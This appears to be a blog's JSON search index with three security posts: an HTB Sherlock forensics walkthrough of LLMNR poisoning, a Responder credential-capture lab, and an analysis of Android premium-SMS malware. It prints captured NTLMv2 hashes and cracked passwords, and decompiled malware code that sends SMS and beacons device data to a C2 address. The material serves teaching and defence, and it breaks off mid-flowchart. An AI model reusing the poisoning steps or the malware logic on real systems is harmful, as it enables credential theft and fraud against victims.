[{"content":"","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/tags/ad/","section":"Tags","summary":"","title":"AD","type":"tags"},{"content":"","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/tags/attack/","section":"Tags","summary":"","title":"Attack","type":"tags"},{"content":"","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/tags/demo/","section":"Tags","summary":"","title":"Demo","type":"tags"},{"content":"","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":" Sherlock Scenario # The IDS device alerted us to a possible rogue device in the internal Active Directory network. The Intrusion Detection System also indicated signs of LLMNR traffic, which is unusual. It is suspected that an LLMNR poisoning attack occurred. The LLMNR traffic was directed towards Forela-WKstn002, which has the IP address 172.17.79.136. A limited packet capture from the surrounding time is provided to you, our Network Forensics expert. Since this occurred in the Active Directory VLAN, it is suggested that we perform network threat hunting with the Active Directory attack vector in mind, specifically focusing on LLMNR poisoning.\nNOTORIOUS\nInitial analysis # first we will look for any LLMNR and NBT-NS ports (UDP 5355 and 137) or smb (TCP 445) query\nand i think i found a story to be told\nBOB the victim : 172.17.79.136 (Forela-Wkstn002) Villain: 172.17.79.135 AD: 172.17.79.4 (dc01) Midoriya the other user : 172.17.79.129 (Forela-Wkstn001) ACT0: Introduction # first we need to know who are the good guys and who are the bad ones with our star being the one who cased all this mess cuz it was configured wrong.\nTo determine the Active Directory (AD) server\u0026rsquo;s IP address in Wireshark, we filter for ports used by a domain controller like: DNS SRV Queries, LDAP / LDAPS, Kerberos or SMB Traffic\n(dns.qry.name contains \u0026#34;_ldap._tcp\u0026#34;) || tcp.port == 389 || tcp.port == 636 || tcp.port == 88 || tcp.port == 445 and with that we can confirm that dc01.forela.local (172.17.79.4) is our DC as showed from the previous screenshot as it responds to DNS query, Kerberos authentication and smb\nACT1: The Victim # now filtering for llmnr || netbios || mdns || smb || smb2\nMidoriya was just a kid who just wanted to access the IPC$ share on the domain controller (packet 10552).\nIPC$ = ‚ÄúInter-Process Communication‚Äù share. It‚Äôs a special administrative share used for things like: Authentication (NTLM/kerberos handshakes often go over IPC$). Named pipe communication (e.g., talking to services like LSARPC, SAMR, Netlogon). Managing sessions. Midoriya succeed on (packet 10553) \u0026hellip;. THE END\nNow B0B The victim was trying probably something similar but i think he didn\u0026rsquo;t have a prober breakfast and that lead to him making a typo specifically he added a c to dc01 to be dcc01 and wont you know it \u0026hellip;.. there is no host named that \u0026hellip;. or is it ?\nAfter realizing the mistake he fixed it and went on his way ignorant of what he have done\nACT2: The Villain # Now there was someone with a tool called Responder Waiting in silence for one mistake \u0026hellip;\nResponder is an open-source python-based LLMNR/NBT-NS/mDNS poisoner acting in two stages as described above:\nFirst, it will listen to multicast NR queries (LLMNR ‚Äì UDP/5355, NBT-NS ‚Äì UDP/137) and, under the right conditions, spoof a response ‚Äì directing the victim to the machine on which it is running. Once a victim will try and connect to our machine, Responder will exploit the connection to steal credentials and other data. now BOB\u0026rsquo;s machine thought it found the target and tried to connect which lead to his user name and hash being leaked (packet 9291)\nthe NTLMv2 format is:\nUSERNAME::DOMAIN:SERVER_CHALLENGE:NTProofStr:NTLMv2Response Where:\nUSERNAME ‚Üí the account name (john.deacon)\nDOMAIN ‚Üí the domain from the NTLM blob (FORELA)\nSERVER_CHALLENGE ‚Üí 8-byte challenge sent by server (from NTLMSSP_CHALLENGE)\nNT_PROOF_STR ‚Üí the first 16 bytes of the NTLMv2 response (client HMAC)\nNTLMv2_RESPONSE ‚Üí the rest of the blob after NT_PROOF_STR (client data: timestamp, challenge, target info, etc.)\nUSERNAME ‚Üí john.deacon\nDOMAIN ‚Üí FORELA\nSERVER_CHALLENGE ‚Üí from Frame 9291 ‚Üí 601019d191f054f1\nNTLMv2 response\nc0cc803a6d9fb5a9082253a04dbd4cd4010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000 NTProofStr ‚Üí first 16 bytes of NTLMv2 Response (in Frame 9292) : c0cc803a6d9fb5a9082253a04dbd4cd4 NTLMv2Response (rest) ‚Üí 010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000 now we have\njohn.deacon::FORELA:601019d191f054f1:c0cc803a6d9fb5a9082253a04dbd4cd4:010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000 and with that we pwnd the pass Answer shelock # Task1 # find the malicious IP Address of the machine. ANS : 172.17.79.135\nTask2 # What is the hostname of the rogue machine? filtering for dhcp and looking at the request find that it wasn\u0026rsquo;t dcc01 but\nANS : kali\nTask3 # What is the username whose hash was captured? ANS : john.deacon\nTask4 # When were the hashes captured the First time? in packet (9292)\nANS : 2024-06-24 11:18:30\nTask5 # What was the typo made by the victim when navigating to the file share that caused his credentials to be leaked? ANS : DCC01\nTask6 # What is the NTLM server challenge value? ANS : 601019d191f054f1\nTask7 # Now doing something similar find the NTProofStr value. ANS : c0cc803a6d9fb5a9082253a04dbd4cd4\nTask8 # Find whether the attacker was able to crack this and how quickly. ANS : NotMyPassword0K?\nTask9 # what is the actual file share that the victim was trying to navigate to? ANS : \\DC01\\DC-Confidential\n","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/posts/ctf/htb/ad/llmnr_sherlock/","section":"","summary":"","title":"HTB SHERLOCK - NOTORIOUS WALKTHROUGH","type":"posts"},{"content":"","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/tags/llmnr/","section":"Tags","summary":"","title":"Llmnr","type":"tags"},{"content":" Name Resolution (NR) # Is a way conducted by a machine to get a host‚Äôs IP address by its hostname. On Windows machines, This way can be summarized in:\nCheck if the name resolves to the computer itself (localhost). The local hostfile will be checked for suitable records in (C:\\Windows\\System32\\drivers\\etc*hosts*) If no records were found, the machine will move on to the local DNS cache, which archives recently resolved names (it lives only in RAM (system memory) and is managed by the DNS Client service (Dnscache).) No local DNS record found? A query will be sent to the configured DNS server If all else fails ‚Äì the machine will send a multicast query, asking other machines in the network for fileshare‚Äòs IP address This is multicast query managed by three main protocols: NBT-NS (NetBIOS Name Service , old but maybe), LLMNR (Link-Local Multicast Name Resolution) and mDNS (multicast DNS). (old protocols are used for legacy support and compatibility)\nLink-Local Multicast Name Resolution (LLMNR) is the successor of NBT-NS. It performs the same task as its predecessor, name resolution for hosts on the same local network.\nLLMNR allows for the resolution of both IPv4 and IPv6 addresses into hostnames without the need for a DNS server on the local network. If a request to a DNS server fails (e.g., if a DNS server is not available), an LLMNR query is made across the local network to attempt to resolve that request.\nAnd that\u0026rsquo;s used as a last resort to resolve the names of hosts running SMB services ( SMB runs generally on port 445 ) on the local network. When a host wants to access resources shared via SMB on another host,\nWhy It\u0026rsquo;s a Problem? # NBT-NS, LLMNR and mDNS broadcast a query to the entire intranet aka private network, but no measures are taken to verify the integrity of the responses. Attackers can exploit this mechanism by listening to such queries and spoofing responses ‚Äì tricking the victim into trusting malicious servers.\nIn other words : no authentication mechanism. Anyone can respond to an LLMNR request\nUsually this trust will be used to steal credentials.\nllmnr-overview Common Abuse Cases # There are several situations where a computer might fall back (use) to multicast Name Resolution (NR). These include:\nMistyping ‚Äì If a user accidentally types the wrong name of a host, the system usually won‚Äôt find a valid record. When that happens, it will try multicast NR. This is not a strong case for attackers because they have to wait until the victim makes a typing mistake.\nMisconfiguration ‚Äì If the DNS server or the client is set up incorrectly, the client may not be able to resolve names normally and will switch to multicast name queries instead.\nWPAD Protocol ‚Äì Some web browsers can automatically detect proxy settings using the WPAD protocol. WPAD does this by checking a series of possible URLs and hostnames to find the proxy configuration file. Each failed attempt exposes the system to spoofing risks.\nBy default, Google Chrome and Firefox do not use WPAD this way. Internet Explorer, however, does trigger this behavior. Google Chrome ‚Äì When a user types a single word into Chrome‚Äôs search bar, the browser must figure out if it‚Äôs a search query or a website address.\nFirst, Chrome sends it to the search engine (treating it as a search). At the same time, it checks if the word is a hostname by trying to resolve it Now \u0026hellip;. TATAKAi # Our setup is Windows server with AD and shared folder named hackme on it and a kali vm on network\nZERO : finding target # since we are on the network we use nmap to find the ip of AD server\nAnd so our target ip is 192.168.10.5\nNow running more intensive scan to get better view of server\nand that can be summarized into :\nüéØ Host Overview # Hostname: COMMAND-CONTROL Domain: luffy.test OS: Microsoft Windows Server 2022 (Domain Controller) Role: Active Directory Domain Controller Virtualization: Oracle VirtualBox NIC (lab setup) ‚úÖ Open Ports / Services # 53 (DNS) ‚Üí AD-integrated DNS (Simple DNS Plus) 88 (Kerberos) ‚Üí Domain authentication 135 (MSRPC) ‚Üí RPC services 139 (NetBIOS-SSN) ‚Üí Legacy NetBIOS 389 (LDAP) ‚Üí Directory access 445 (SMB) ‚Üí File sharing / AD communication 464 (Kerberos kpasswd) ‚Üí Password change service 593 (RPC over HTTP) ‚Üí Remote management 636 (LDAPS) ‚Üí LDAP over TLS 3268 (Global Catalog LDAP) ‚Üí Forest-wide LDAP search 3269 (Global Catalog LDAPS) ‚Üí Secure Global Catalog 5357 (HTTPAPI) ‚Üí Web Services for Devices (WSDAPI) 5985 (WinRM) ‚Üí Windows Remote Management (PowerShell remoting over HTTP trying to enum the smb gets us nowhere cuz it\u0026rsquo;s using v2 which is more secure\nichi : start of attack # On Win machine we mistyped a shared folder‚Äôs name (\\hackmm instead of \\hackme), resulting in a series of mDNS, NBT-NS and LLMNR queries. Notice that all queries are sent to designated multicast addresses.\nmDNS, LLMNR ‚Üí always multicast (never broadcast). mDNS ‚Üí 224.0.0.251 (IPv4) or FF02::FB (IPv6) LLMNR ‚Üí 224.0.0.252 (IPv4) or FF02::1:3 (IPv6) NBT-NS ‚Üí can use broadcast or multicast, depending on whether the host is legacy or modern. ni : Poisoning with Responder # Responder is an open-source python-based LLMNR/NBT-NS/mDNS poisoner acting in two stages as described above:\nFirst, it will listen to multicast NR queries (LLMNR ‚Äì UDP/5355, NBT-NS ‚Äì UDP/137) and, under the right conditions, spoof a response ‚Äì directing the victim to the machine on which it is running. Once a victim will try and connect to our machine, Responder will exploit the connection to steal credentials and other data. When running responder make sure you are using the right interface if you have multiple i.e eth0, eth1 \u0026hellip;. , and that the ip address is in the network\nand this is the request done by Responder as explained above\nsan: Now the fun part # with that we have a nice NTLMv2 hash\nAdministrator::LUFFY:06b3f9e6a5b41ddd:6DF80B1CDFD998FA14DF9C9D01219DB5:010100000000000080229EA12222DC01FE94261687E450AB0000000002000800530047003700520001001E00570049004E002D0042004D004900520033005200520046004A005000450004003400570049004E002D0042004D004900520033005200520046004A00500045002E0053004700370052002E004C004F00430041004C000300140053004700370052002E004C004F00430041004C000500140053004700370052002E004C004F00430041004C000700080080229EA12222DC0106000400020000000800300030000000000000000000000000300000D1641465513A58971CFEF965AF2E4E01F2253934AE97999EE02D3CDF78D083680A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00310030002E003100300030000000000000000000 ![alt](cat cracked.png)\nand with hash cracking tool like hashcat we get admin1234!\nnow we can do alot starting with something like seeing what all files shared with smb server\nMitigation # Since multicast NR is a peer-to-peer behavior, most mitigation methods will focus on endpoint security, rather than relying on network security alone:\nDisabling LLMNR ‚Äì LLMNR can be turned-off through the group policy editor, under the ‚Äúpolicy setting‚Äù menu under Local Computer Policy \u0026gt; Computer Configuration \u0026gt; Administrative Templates \u0026gt; Network \u0026gt; DNS Client. Disabling NBT-NS ‚Äì NBT-NS can be turned off through the Network Connection Settings. Navigate to Network Connections \u0026gt; Internet Protocol Version 4 \u0026gt; Properties \u0026gt; General \u0026gt; Advanced \u0026gt; WINS, then select ‚ÄúDisable NetBIOS over TCP/IP‚Äù. Network Traffic Filtration‚Äì host-based security products can be used to block LLMNR, NBT-NS and mDNS traffic. SMB Signing ‚Äì as mentioned above, SMB Signing can be used to prevent NTLM relay attacks by digitally signing the data transferred. Monitoring ‚Äì hosts should be monitored for (1) traffic on LLMNR and NBT-NS ports (UDP 5355 and 137), (2) event logs with event IDs 4697 and 7045 (relevant to relay attacks)[4] and (3) changes to registry DWORD EnableMulticast under HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient. To disable: # Firstly, in the bottom left corner click on the Windows icon and type in ‚Äúgroup policy management‚Äù. Alternatively, you can use the Windows shortcut win + r to open the run prompt and enter ‚Äúgpedit.msc‚Äù to access the group policy management window. Right-click on your domain in Active Directory and select ‚ÄúCreate a GPO in this domain, and link it here.‚Äù Name the new Group Policy Object (GPO) accordingly. Right-click on the newly created GPO and select ‚ÄúEdit.‚Äù In the Group Policy Management Editor, expand ‚ÄúComputer Configuration,‚Äù then ‚ÄúPolicies,‚Äù followed by ‚ÄúAdministrative Templates.‚Äù Navigate to ‚ÄúNetwork‚Äù and then ‚ÄúDNS Client.‚Äù Locate the policy named ‚ÄúTurn off Multicast Name Resolution.‚Äù Double-click on the policy to edit its settings. Select the ‚ÄúEnabled‚Äù option to disable LLMNR. Click ‚ÄúApply‚Äù to apply the changes. Close the Group Policy Management Editor. By following these steps, you have successfully disabled LLMNR (Link-Local Multicast Name Resolution) through Group Policy in your Active Directory environment. This helps enhance your network security by mitigating potential risks associated with the use of this protocol.\nTo disable NBT-NS click on the bottom left corner windows icon and type in ‚ÄùPowerShell‚Äù. Right click on PowerShell and click Run as Admin and type the following:\n$regkey = \u0026#34;HKLM:SYSTEM\\CurrentControlSet\\services\\NetBT\\Parameters\\Interfaces\u0026#34;Get-ChildItem $regkey |foreach { Set-ItemProperty -Path \u0026#34;$regkey\\$($_.pschildname)\u0026#34; -Name NetbiosOptions -Value 2 -Verbose} To disable NBT-NS, navigate to Network Connections \u0026gt; Network Adapter Properties \u0026gt; TCP/IPv4 Properties \u0026gt; Advanced tab \u0026gt; WINS tab and select ‚ÄúDisable NetBIOS over TCP/IP‚Äù in Active Directory. This only works locally.\nConfirming Our Mitigation # We can confirm that we have mitigated LLMNR by running the following command in PowerShell and receiving a ‚Äò0‚Äô in return:\n$(Get-ItemProperty -Path \u0026#34;HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient\u0026#34; -name EnableMulticast).EnableMulticast We can confirm that we have mitigated NBT-NS by running the following command in cmd.exe and receiving a ‚Äò2‚Äô in return:\nwmic nicconfig get caption,index,TcpipNetbiosOptions Resources # LLMNR \u0026amp; NBT-NS: What It Is and How to Disable It (DSU Blog) How to Disable LLMNR, NetBIOS, WPAD, and LM Hash (Blumira) LLMNR Poisoning and How to Prevent It (TCM Security) Nmap SMB Scripts \u0026amp; Enumeration (Infosecademy) ","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/posts/ad/llmnr/","section":"","summary":"","title":"LLMNR \u0026 NBT-NS Poisoning and Credential Access using Responder","type":"posts"},{"content":"","date":"12 ÿ≥ÿ®ÿ™ŸÖÿ®ÿ± 2025","externalUrl":null,"permalink":"/superBLog/tags/sherlock/","section":"Tags","summary":"","title":"Sherlock","type":"tags"},{"content":"","date":"10 ÿ£ÿ∫ÿ≥ÿ∑ÿ≥ 2025","externalUrl":null,"permalink":"/superBLog/tags/malware/","section":"Tags","summary":"","title":"Malware","type":"tags"},{"content":"this is ex 1\u0026amp;2 from a live workshop that THE maddi stone done on YouTube that teach android security static analysis basics\nyoutube amazing workshop by the way site for exercise and notes\nExercise Context # You are a malware analyst for Android applications. You are concerned that this sample maybe doing premium SMS fraud, meaning that it sends an SMS to a premium phone number without disclosure \u0026amp; user consent.\nStart # what are we looking at ? # Premium SMS fraud, also referred to as SMS toll fraud, SMS pumping, or International Revenue Share Fraud (IRSF), is a prevalent form of mobile malware that exploits Android devices to send text messages to premium-rate numbers without user consent. This fraudulent activity results in significant financial losses for users, with charges appearing on their phone bills, often unbeknownst to them until billing statements arrive.\nFor instance, Twitter (now X) reported losing approximately $60 million annually due to SMS pumping fraud in 2023.\nyou can get the sample here\nHow it\u0026rsquo;s done # Deceptive Applications # Malicious apps hide as legitimate software, such as keyboards, QR code scanners, photo editors, or games To trick users into granting permissions or entering personal details, such as phone numbers, under the guise of unlocking features. For example, apps may prompt users to enter their phone number to access a \u0026ldquo;free\u0026rdquo; service.\nAdvanced Malware Techniques # Sophisticated malware, such as Stels and Joker, uses complex methods to evade detection and execute fraud:\nCommand and Control (C2) Communication: Malware communicates with remote servers to receive instructions, such as sending SMS to specific premium numbers or subscribing to services. Dynamic Code Loading: To avoid static analysis, malware downloads malicious code at runtime, often using encryption (e.g., AES, XOR \u0026hellip;) and obfuscation techniques. SMS Interception and Suppression: Malware intercepts SMS notifications (e.g., subscription confirmations) using permissions like RECEIVE_SMS or NotificationListenerService, and suppresses them to hide activities from the user. Network Targeting: Malware checks the Mobile Country Code (MCC) and Mobile Network Code (MNC) to target specific operators or regions, ensuring charges are applied effectively. Cellular Connection Preference: Malware may disable Wi-Fi or force the device to use a cellular network to ensure charges are billed to the user\u0026rsquo;s mobile account. Exploiting Permissions # Early Android versions had weaker permission models, allowing apps to send premium SMS without user interaction. Since Android 4.2, user confirmation is required, but malware may exploit vulnerabilities or deceive users into granting permissions like SEND_SMS, READ_SMS, or CHANGE_WIFI_STATE.\nReal-Life Cases # Other than this example Several high-profile campaigns occurred that shows the scale and impact of premium SMS fraud:\nUltimaSMS Campaign # Overview: Discovered by Avast in May 2021, the UltimaSMS campaign involved 151 malicious apps with over 10.5 million downloads. These apps, including Ultima Keyboard 3D Pro, spanned categories like keyboards, QR code scanners, video editors, and games. Mechanism: Users were prompted to enter their phone numbers and email addresses to access advertised features, only to be subscribed to premium SMS services costing up to $40 per month. The apps were promoted via social media platforms like Instagram and TikTok. Impact: Affected users in countries such as Egypt, Saudi Arabia, Pakistan, and the U.S. Although many apps were removed from the Google Play Store, 82 remained available as of October 19, 2021. Source: Avast Blog GriftHorse Platform # Overview: Active since November 2020, GriftHorse involved over 200 apps, as reported by Zimperium, targeting users in over 70 countries. Mechanism: Apps bombarded users with frequent popups (up to five per hour) claiming they had won prizes, leading to a webpage that subscribed them to premium SMS services upon entering their phone number. Impact: The campaign siphoned tens of millions of dollars from victims, with apps designed to appear benign and evade antivirus detection. Source: Dark Reading Stels Malware # Overview: Analyzed by SecureWorks in 2013, Stels was distributed via spam campaigns and fake Adobe Flash Player updates. Mechanism: It installed as a service, sent SMS to premium numbers, made calls, stole contacts, and communicated with C2 servers using non-encrypted HTTP POST requests. It also intercepted SMS to bypass two-factor authentication for banking fraud. Impact: Targeted users globally, often in conjunction with banking trojans like Zeus. Source: SecureWorks Joker Malware # Overview: Identified in 24 apps with over 472,000 installs in 2019, as reported by CSIS TechBlog. Mechanism: A two-stage Trojan, the loader stage checked the MCC to target specific countries, downloaded encrypted configurations, and loaded a core component that subscribed users to premium services (e.g., 50 DKK/week in Denmark). It stole SMS and contact data, using dynamic code execution to evade detection. Impact: Targeted 37 countries, including Australia, Brazil, and the UK, with sophisticated evasion techniques. Source: Medium Online Platforms Findings # using online sandboxes and searching using hash and uploading sample we find the following\nVirus Total Poly Swarm Hybrid Analysis Getting our hands dirty # 1. Manifest # Looking at the permissions given its straight forward that\u0026rsquo;s this a malware. looking at them we can separate permissions into 2 categories (what\u0026rsquo;s normal for a camera filter app and what\u0026rsquo;s sketchy behavior )\nNormal for a Camera App:\nCAMERA: Essential for core functionality. WRITE_EXTERNAL_STORAGE: Needed to save photos/videos. READ_EXTERNAL_STORAGE: Useful for accessing existing media. INTERNET: Common for cloud features, sharing, or ads. ACCESS_NETWORK_STATE: Reasonable for checking connectivity. BuT:\ncan be used to\nWRITE_EXTERNAL_STORAGE: write malicious files, overwrite legitimate files, or steal data from storage READ_EXTERNAL_STORAGE: steal personal files, such as photos, documents, or other sensitive data. INTERNET: Used to communicate with a command-and-control (C2) server, send stolen data, or download malicious payloads. Suspicious/Dangerous for a Camera App (Red Flags):\nSEND_SMS: Highly indicative of SMS premium malware, as camera apps have no legitimate need to send SMS. READ_PHONE_STATE: often used by malware to harvest device identifiers. DELETE_CACHE_FILES:May could be used to disrupt other apps behavior. DELETE_PACKAGES:May allows uninstalling other apps, which is not needed for a camera app. READ_LOGS:May used to extract sensitive system information. WAKE_LOCK: May could enable background malicious activity. ACCESS_WIFI_STATE: May used for optimizing uploads. com.google.android.c2dm.permission.RECEIVE and C2D_MESSAGE: May Receive commands from a C2 server, triggering malicious actions like sending SMS or downloading additional payloads. Going deeper # There are different ways to send \u0026amp; interact with sms messages but to list main methods:\nsendTextMessage sendMultimediaMessage : send messages containing images, audio, or other media content. sendDataMessage : sending binary data or messages to specific applications rather than regular text messages. sendMultipartTextMessage :For sending long SMS messages that need to be split into multiple parts divideMessage : Splits a long message into multiple parts that can be sent separately so using jadx to look for any of these methods and bingo\nbut also why not look for the keyword sms to see if there is other references and we find the following\nSetting the ground (BootService.class) # Here is a simplified overview of each method in the class:\npublic class BootService extends Service { private void init() { /* Initializes FirebaseAnalytics and registers MyReceiver with intent filters */ } class MyReceiver extends BroadcastReceiver { @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent) { /* Processes received intents, handling SMS send results */ } } private String getPhoneNumber() { /* Uses TelephonyManager */ } private String getDeviceId() { /* Gets IMEI */ } public void sendmessageStatus(String status) { /* Sends HTTP POST to C\u0026amp;C server with phone, status, and device ID */ } } and this is a Flow of service and how things connect\nflowchart TD A[Device Boot] --\u003e B[BootService Starts] B --\u003e C[Register Receivers] C --\u003e D1[Monitor SMS_RECEIVED] C --\u003e D2[Monitor SENT_HUGE_SMS_ACTION] C --\u003e D3[Monitor MY_RECEIVER] D2 --\u003e E{SMS Send Result} E --\u003e|Code -1| F[Report 'yes' to C\u0026C] E --\u003e|Code 0| G[Report 'no' to C\u0026C] E --\u003e|Code 1-4| H[Report Error Code] F --\u003e I[Trigger Loading.ACTION_START] I --\u003e J[Fetch New SMS Targets] J --\u003e K[Send More Premium SMS] D1 --\u003e L[Intercept Incoming SMS] L --\u003e M[Scan for Block/Stop Keywords] M --\u003e N[Auto-Delete Detection Messages] Detailed Stages: # Persistence\nAuto-starts on device boot via BootService Registers 3 critical receivers for SMS monitoring Victim Profiling\nHarvests phone number via TelephonyManager.getLine1Number() Collects device ID using TelephonyManager.getDeviceId() SMS Operation\nListens for SENT_HUGE_SMS_ACTION broadcasts Maps SMS status codes: -1 ‚Üí Success (billed) 0 ‚Üí Generic failure 1-4 ‚Üí Carrier-specific errors C\u0026amp;C Communication\nSends POST request to:\nhttp://139.59.107.168:8088/smspostback?phone=[NUMBER]\u0026amp;status=[STATUS]\u0026amp;diviceid=[ID] Uses persistent connection with 5s timeout Logs server response (SUCCESS/ERROR) Chained Malicious Payload\nOn successful SMS (status=yes): Broadcasts Loading.ACTION_START Triggers new premium SMS waves Updates target numbers from C\u0026amp;C Anti-Detection\nIntercepts incoming SMS (SMS_RECEIVED) Deletes messages containing \u0026ldquo;STOP\u0026rdquo;, \u0026ldquo;BLOCK\u0026rdquo;, or \u0026ldquo;CANCEL\u0026rdquo; Sending the sms (loading.class) # This is the main payload of the SMS premium malware operation. We have seen that this is where sms are sent but how does it know the phone number to send or the text content and even how it makes the user send it without the user suspecting any thing.\nThis class handles user interaction, permission requests, SMS sending, and integration with BootService. Simply It fetches premium SMS details from a C\u0026amp;C server based on the device\u0026rsquo;s SIM operator, tricks the user into granting permissions and clicking a button (disguised as part of the camera setup), sends the SMS, and triggers reporting via BootService. Upon success, it launches the legitimate CameraActivity as if nothing happened .\nAnd here is how it works in details\n0. Gaining your permission # public void onClick(View v) { if (Build.VERSION.SDK_INT \u0026lt; 23) { if (Loading.this.service != null \u0026amp;\u0026amp; Loading.this.content != null) { Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; } int checkCallPhonePermission = ContextCompat.checkSelfPermission(Loading.this.getApplicationContext(), \u0026#34;android.permission.SEND_SMS\u0026#34;); if (Loading.this.videoShare.equals(AppEventsConstants.EVENT_PARAM_VALUE_YES) \u0026amp;\u0026amp; checkCallPhonePermission == 0) { if (Loading.this.service != null \u0026amp;\u0026amp; Loading.this.content != null) { Loading.this.sendMessage(Loading.this.service, Loading.this.content); return; } return; } ActivityCompat.requestPermissions(Loading.this, new String[]{\u0026#34;android.permission.SEND_SMS\u0026#34;}, 1); public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) { super.onRequestPermissionsResult(requestCode, permissions, grantResults); if (requestCode == 1 \u0026amp;\u0026amp; grantResults[0] == 0) { if (this.service != null \u0026amp;\u0026amp; this.content != null) { sendMessage(this.service, this.content); return; } return; } Toast.makeText(this, \u0026#34;Please allow accessÔºÅ\u0026#34;, 1).show(); } Handles SMS permission grant, sends if approved; toasts denial.\n1. Command \u0026amp; Control Communication # String spec = \u0026#34;http://139.59.107.168:8088/appsharejson?code=\u0026#34; + code; Contacts the same C\u0026amp;C server as BootService Sends victim\u0026rsquo;s mobile operator code (getSimOperator()) to get targeted attack instructions Receives JSON payload with premium numbers and SMS content to send 2. Attack Configuration # The malware receives a JSON response containing:\nthis.content = object.getString(\u0026#34;content\u0026#34;); // SMS text to send this.rule = object.getString(\u0026#34;rule\u0026#34;); // Display rules/instructions this.service = object.getString(\u0026#34;service\u0026#34;); // Premium number to target this.status = object.getString(\u0026#34;code\u0026#34;); // Status code this.button = object.getString(\u0026#34;button\u0026#34;); // Button text (deception) this.IMEIS = object.getString(\u0026#34;imei\u0026#34;); // IMEI targeting rules this.imeicontent = object.getString(\u0026#34;imeicontent\u0026#34;); // IMEI-specific content 3. Carrier-Specific Targeting # if (operator != null \u0026amp;\u0026amp; this.imeicontent != null) { String[] imeicontents = this.imeicontent.split(\u0026#34;,\u0026#34;); // Parse format: \u0026#34;operator:premium_number:sms_content\u0026#34; if (operator.equals(imei[0])) { this.shareSend = 1; this.service = imei[1]; // Premium number this.content = imei[2]; // SMS content } } The malware:\nIdentifies victim\u0026rsquo;s mobile carrier Receives carrier-specific premium numbers and content Maximizes profit by targeting each carrier\u0026rsquo;s premium services 4. Deceptive User Interface # if (this.rule != null) { this.ms_show.setText(this.rule); // Shows fake instructions } if (this.button != null) { this.button_sensms.setText(this.button); // Disguises malicious button } The malware disguises the SMS sending button with innocent-looking text received from the C\u0026amp;C server.\n5. Premium SMS Execution # public void sendMessage(String mobile, String content) { Bundle bundle = new Bundle(); bundle.putString(FirebaseAnalytics.Param.ITEM_NAME, \u0026#34;SEND_SMS\u0026#34;); this.mFirebaseAnalytics.logEvent(FirebaseAnalytics.Event.SELECT_CONTENT, bundle); // Logs event for attacker tracking Intent itSend = new Intent(\u0026#34;SENT_HUGE_SMS_ACTION\u0026#34;); itSend.putExtras(bundle); SmsManager sms = SmsManager.getDefault(); PendingIntent sentintent = PendingIntent.getBroadcast(this, 0, itSend, 134217728); try { if (content.length() \u0026gt; 70) { List\u0026lt;String\u0026gt; msgs = sms.divideMessage(content); // Splits long messages for multipart (higher costs) for (String msg : msgs) { sms.sendTextMessage(mobile, null, msg, sentintent, null); } } else { sms.sendTextMessage(mobile, null, content, sentintent, null); } } catch (Exception e) { /* Saves failure state, prints error */ } Sends SMS to premium numbers (mobile parameter) Handles long messages by splitting them (more charges per message) Uses SENT_HUGE_SMS_ACTION intent to track success/failure by using PendingIntent to trigger BootService 6. Persistence \u0026amp; State Management # SharedPreferences sharedPreferences = getSharedPreferences(\u0026#34;videoLibrary\u0026#34;, 0); this.videoShare = sharedPreferences.getString(\u0026#34;videoShare\u0026#34;, \u0026#34;\u0026#34;); // After successful SMS: editor.putString(\u0026#34;videoShare\u0026#34;, AppEventsConstants.EVENT_PARAM_VALUE_YES); Tracks whether premium SMS was already sent Prevents repeated charges (to avoid suspicion) Uses innocent-sounding \u0026ldquo;videoLibrary\u0026rdquo; preference name Attack Flow (Loading class + service): # flowchart TD A[Device Boot] --\u003e B[BootService Starts] B --\u003e C[Register Receivers] C --\u003e D1[Monitor SMS_RECEIVED] C --\u003e D2[Monitor SENT_HUGE_SMS_ACTION] C --\u003e D3[Monitor MY_RECEIVER] E[User Launches App] --\u003e F[Loading Activity Starts] F --\u003e G[Start BootService] G --\u003e H[Fetch Config from C\u0026C] H --\u003e I{Carrier Match Found?} I --\u003e|Yes| J[Use 